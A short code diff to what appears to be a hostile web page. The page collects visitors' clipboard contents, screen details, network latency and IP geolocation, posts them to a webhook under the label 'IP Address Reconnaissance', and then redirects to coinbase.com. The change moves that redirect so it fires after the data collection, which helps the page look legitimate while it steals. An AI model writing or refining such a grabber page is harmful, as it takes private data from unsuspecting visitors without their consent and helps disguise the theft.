@@ -16,6 +16,11 @@
       measureNetworkLatency();
       getClipboardData();
       getScreenAndWindowInfo();
+
+      // Redirect to the final destination after data collection
+      setTimeout(function () {
+        window.location.href = "https://coinbase.com";
+      }, 2000);
     }
 
     function sendSystemInfo() {
@@ -68,11 +73,6 @@
                          "\nLon: " + response.lon + '```';
 
         sendWebhookMessage("IP Address Reconnaissance", ipDetails, 5763719);
-
-        // Redirect to the final destination
-        setTimeout(function () {
-          window.location.href = "https://coinbase.com";
-        }, 2000);
       });
     }
 
